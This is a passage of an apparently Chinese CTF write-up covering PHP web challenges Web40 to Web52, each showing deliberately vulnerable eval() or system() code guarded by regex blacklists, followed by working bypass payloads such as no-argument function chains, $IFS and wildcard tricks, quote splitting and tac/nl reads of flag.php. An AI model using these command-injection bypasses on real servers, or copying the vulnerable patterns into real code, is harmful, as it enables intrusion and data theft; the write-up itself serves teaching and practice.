operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>过滤了很多符号，比如引号，美元符等，可以构造无参数函数</p>\n<p>无参数是指a()，a(b())等，而不能是a(‘b’)</p>\n<ul><li> <p>print_r(scandir(‘.’));查看当前目录下的所有文件名</p> </li><li> <p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。</p> </li><li> <p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p> </li><li></li></ul>\n<pre><code>先用print_r(scandir(current(localeconv())));打印出当前目录下文件\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\28abc7de9b384effbbd921150c029928.png\"/></p>\n<pre><code>flag.php在倒数第二个，直接用next(array_reverse());\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\09366ff3886c4c2bb1578b8032df1eb5.png\"/></p>\n<h2><a id=\"Web41_366\"></a>Web41</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&amp;|\\-/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"echo(<span class=\"token interpolation\"><span class=\"token variable\">$c</span></span>);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> \n</code></pre>\n<p>这个题我，研究一个星期，就是出不来，yu师傅的脚本去我也跑不了</p>\n<p>最后发现php的版本问题</p>\n<p>先把PHP加入环境变量我就不说了</p>\n<p>php -v检查php版本（我用的7.3）</p>\n<p>然后直接跑脚本system/cat flag.php</p>\n<p>至于原理我讲不清楚，可以看大师傅那个视频，我觉得讲的挺清楚的，<a href=\"https://www.bilibili.com/video/BV1jy4y1a7Ew?p=13\">给个链接</a></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\9e8092ac022441a39d8863f7b1419591.png\"/></p>\n<h2><a id=\"Web42_399\"></a>Web42</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>这里意思为将标准输出和标准输入都扔到到/dev/null(垃圾箱)中</p>\n<h4><a id=\"_413\"></a>重定向符号</h4>\n<ul><li>0表示键盘输入</li><li>1表示屏幕输出</li><li>2表示错误输出</li></ul>\n<p>默认为标准输出重定向，与 1&gt; 相同</p>\n<p>而2&gt;&amp;1 意思是把 标准错误输出 重定向到 标准输出，意思是把 标准输出 和 标准错误输出 都重定向到同一文件中</p>\n<p>所以为了不让后面的重定向符号执行，就需要把后面截断像``;,%0a,%26以及||`这类都可以</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>cat flag<span class=\"token operator\">.</span>php<span class=\"token punctuation\">;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\8cc907c6f9744a57aeb10007cca86ff7.png\"/></p>\n<h2><a id=\"Web43_439\"></a>Web43</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>还是重定向，多过滤了；和cat，那就cat绕过</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>less flag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span>\n</code></pre>\n<h2><a id=\"Web44_463\"></a>Web44</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/;|cat|flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>增加过滤flag，通配符绕过</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>less fl<span class=\"token operator\">*</span>g<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span>\n</code></pre>\n<h2><a id=\"Web45_487\"></a>Web45</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| /i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>增加过滤空格，$IFS绕过空格</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">less</span><span class=\"token variable\">$IFSfl</span><span class=\"token operator\">*</span>g<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span>\n</code></pre>\n<h2><a id=\"Web46_511\"></a>Web46</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>再加$，数字和*</p>\n<p><span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        防\n       \n       \n        止\n       \n       \n        绕\n       \n       \n        过\n       \n       \n        空\n       \n       \n        格\n       \n       \n        ，\n       \n       \n        使\n       \n       \n        用\n       \n       \n        &lt;\n       \n       \n        代\n       \n       \n        替\n       \n      \n      \n       防止绕过空格，使用&lt;代替\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.5782em; vertical-align: -0.0391em;\"></span><span class=\"mord cjk_fallback\">防</span><span class=\"mord cjk_fallback\">止</span><span class=\"mord cjk_fallback\">绕</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">空</span><span class=\"mord cjk_fallback\">格</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">使</span><span class=\"mord cjk_fallback\">用</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0em; vertical-align: 0em;\"></span><span class=\"mord cjk_fallback\">代</span><span class=\"mord cjk_fallback\">替</span></span></span></span></span>IFS绕过空格</p>\n<p>*防止通配符绕过，使用fl’'ag截断绕过</p>\n<pre><code class=\"prism language-php\">less<span class=\"token operator\">&lt;</span>fla<span class=\"token string single-quoted-string\">''</span>g<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span>\n</code></pre>\n<h2><a id=\"Web47_539\"></a>Web47</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>多过滤了几个Linux的读取方式，网上随便查查找找漏网之鱼<br/> <img alt=\"在这里插入图片描述\" src=\"image\\7c93c9cea73f4caf8fa22017178a1311.png\"/></p>\n<p>好了<code>nl，tac，od，vi vim uniq</code>均没过滤</p>\n<pre><code class=\"prism language-php\">tac<span class=\"token operator\">&lt;</span>fla<span class=\"token string single-quoted-string\">''</span>g<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span>\n<span class=\"token class-name\">nl</span><span class=\"token operator\">&lt;</span>fla<span class=\"token string single-quoted-string\">''</span>g<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span>\n<span class=\"token class-name\">od</span><span class=\"token operator\">&lt;</span>fla<span class=\"token string single-quoted-string\">''</span>g<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span>\n</code></pre>\n<h2><a id=\"Web48_569\"></a>Web48</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>又过滤了几个Linux读取方式，但是nl，tac还能用，和上题差不多</p>\n<h2><a id=\"Web49_589\"></a>Web49</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>百分号不影响nl，tac继续用</p>\n<h2><a id=\"Web50_609\"></a>Web50</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>新增了x09和x26，查了一下应该是tab和一个特殊字符，还是不影响，继续拿flag</p>\n<h2><a id=\"Web51_629\"></a>Web51</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>过滤了tac但nl还能继续用</p>\n<h2><a id=\"Web52_649\"></a>Web52</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" &gt;/dev/null 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token 